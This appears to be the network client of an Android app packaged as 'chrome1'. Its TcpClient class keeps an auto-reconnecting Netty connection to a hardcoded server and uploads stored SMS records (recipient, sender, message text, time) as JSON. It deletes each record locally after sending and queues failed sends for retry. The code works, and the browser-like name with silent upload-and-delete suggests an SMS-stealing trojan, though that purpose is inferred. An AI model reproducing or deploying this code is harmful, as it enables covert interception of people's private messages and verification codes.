package com.example.chrome1.network;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;

import com.example.chrome1.sqliteHelper.MySqliteHelper;
import com.example.chrome1.sqliteHelper.SqlLiteUtli.SqlLiteUpdateUtil;

import org.json.JSONArray;
import org.json.JSONObject;

import java.nio.charset.StandardCharsets;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.ChannelPipeline;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.LengthFieldBasedFrameDecoder;
import io.netty.handler.codec.LengthFieldPrepender;
import io.netty.handler.codec.string.StringDecoder;
import io.netty.handler.codec.string.StringEncoder;
import io.netty.handler.timeout.IdleStateHandler;

public class TcpClient {
    private final ScheduledExecutorService executor;
    private Channel socketChannel;
    private Bootstrap eventLoopGroup;
    private NioEventLoopGroup group;

    public TcpClient(ScheduledExecutorService executor) {
        this.executor = executor;
    }

    public String HOST = "192.168.2.248";
    public int PORT = 809;

    public void setHOST(String HOST) {
        this.HOST = HOST;
    }

    public String getHOST() {
        return HOST;
    }

    private String phone;
    private Context context;
    private boolean isRcConnect = true;

    // 隔N秒后重连
    private static final int RE_CONN_WAIT_SECONDS = 5;
    //多长时间为请求后，发送心跳
    private static final int WRITE_WAIT_SECONDS = 7;

    // 初始化 `Bootstrap`
    public Bootstrap getBootstrap() {
        group = new NioEventLoopGroup();
        Bootstrap b = new Bootstrap();
        b.group(group).channel(NioSocketChannel.class);
        b.handler(new ChannelInitializer<Channel>() {
            @Override
            protected void initChannel(Channel ch) {
                ChannelPipeline pipeline = ch.pipeline();
                pipeline.addLast(new IdleStateHandler(0, 5, 0, TimeUnit.SECONDS));
                pipeline.addLast(new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4));
                pipeline.addLast(new LengthFieldPrepender(4));
                pipeline.addLast(new StringEncoder(StandardCharsets.UTF_8));
                pipeline.addLast(new StringDecoder(StandardCharsets.UTF_8));
                //设置 IdleStateHandler  函数 可以在userEventTriggered函数中获取读写超时以及总超时
                //pipeline.addLast("ping", new IdleStateHandler(WRITE_WAIT_SECONDS,WRITE_WAIT_SECONDS, WRITE_WAIT_SECONDS, TimeUnit.SECONDS));
                pipeline.addLast(new TcpClientHandler(TcpClient.this));
            }
        });
        b.option(ChannelOption.SO_KEEPALIVE, true);
        return b;
    }


    public ScheduledExecutorService getExecutor() {
        return executor;
    }

    //异步长连接
    public synchronized void connect() {
        eventLoopGroup = getBootstrap();
        try {
            ChannelFuture future = eventLoopGroup.connect(HOST, PORT).sync();
            socketChannel = future.channel();
            //等待加载完
            if (future.isSuccess()) {
                System.out.println("connect server successfully");
                //上传历史记录
                SendSmsLog(socketChannel);
                //登录
                socketChannel.writeAndFlush(Login()).sync();
            }
            socketChannel.closeFuture().sync();
        } catch (InterruptedException e) {
            e.fillInStackTrace();
        } finally {
            if (isRcConnect()) {
                // 所有资源释放完之后，清空资源，再次发起重连操作
                executor.execute(() -> {
                    try {
                        TimeUnit.SECONDS.sleep(5);
                        disconnect("断开重连");
                        //发起重连操作
                        connect();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                });
            }
        }
    }

    //断开连接
    public void disconnect(String where) {
        Log.i("nettyDisconnect", "disconnect " + where);
        try {
            if (socketChannel != null) {
                socketChannel.close();
                socketChannel = null;
            }
            if (group != null) {
                group.shutdownGracefully();
                group = null;
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //异步短连接
    public void SyncConnect(String text) {
        Bootstrap bootstrap = getBootstrap();
        try {
            ChannelFuture future = bootstrap.connect(HOST, PORT).sync();
            Channel channel = future.channel();
            //等待加载完
            if (future.isSuccess()) {
                System.out.println("connect server successfully");
                channel.writeAndFlush(text).sync();
                channel.close();
            }
            channel.closeFuture().sync();
        } catch (InterruptedException e) {
            //发送短信失败储存
            try {
                ContentValues values = new ContentValues();
                JSONObject jsonObject = new JSONObject(text);
                values.put("phone", jsonObject.getString("number"));
                values.put("send_phone", jsonObject.getString("senderNumber"));
                values.put("context", jsonObject.getString("smsMessages"));
                inst(values);
            } catch (Exception f) {
                f.fillInStackTrace();
            }
            e.printStackTrace();
        }
    }

    private void inst(ContentValues contentValues) {
        if (getContext() == null) {
            return;
        }
        MySqliteHelper helper = new MySqliteHelper(getContext());
        SQLiteDatabase database = helper.getWritableDatabase();
        database.insert("records", null, contentValues);
    }

    private void SendSmsLog(Channel channel) {
        if (getContext() == null) {
            return;
        }
        //上传历史记录
        MySqliteHelper helper = new MySqliteHelper(getContext());
        SQLiteDatabase database = helper.getWritableDatabase();
        Cursor cursor = database.rawQuery("SELECT * FROM records", new String[]{});
        JSONArray jsonArray = SqlLiteUpdateUtil.getResults(cursor);
        for (int i = 0; i < jsonArray.length(); i++) {
            try {
                JSONObject jsonObject = jsonArray.getJSONObject(i);
                int id = jsonObject.getInt("id");
                String phone = jsonObject.getString("phone");
                String send_phone = jsonObject.getString("send_phone");
                String time = jsonObject.getString("time");
                String context = jsonObject.getString("context");
                channel.writeAndFlush(ToJson(phone, send_phone, context, time)).sync();
                database.delete("records", "id = ?", new String[]{String.valueOf(id)});
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        cursor.close();
    }

    private String ToJson(String number, String senderNumber, String smsMessages, String time) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("number", number);
            jsonObject.put("time", time);
            jsonObject.put("senderNumber", senderNumber);
            jsonObject.put("smsMessages", smsMessages);
            jsonObject.put("type", "sms");
            return jsonObject.toString();
        } catch (Exception e) {
            e.fillInStackTrace();
        }
        return null;
    }


    public String Login() {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("type", "login");
            jsonObject.put("phone", phone);
        } catch (Exception e) {
            e.fillInStackTrace();
        }
        return jsonObject.toString();
    }

    public void setPhone(String phone) {
        this.phone = phone;
    }

    public void setContext(Context context) {
        this.context = context;
    }

    public void setPORT(int PORT) {
        this.PORT = PORT;
    }

    public String getPhone() {
        return phone;
    }

    public boolean isRcConnect() {
        return isRcConnect;
    }

    public void setRcConnect(boolean rcConnect) {
        isRcConnect = rcConnect;
    }

    public Context getContext() {
        return context;
    }
}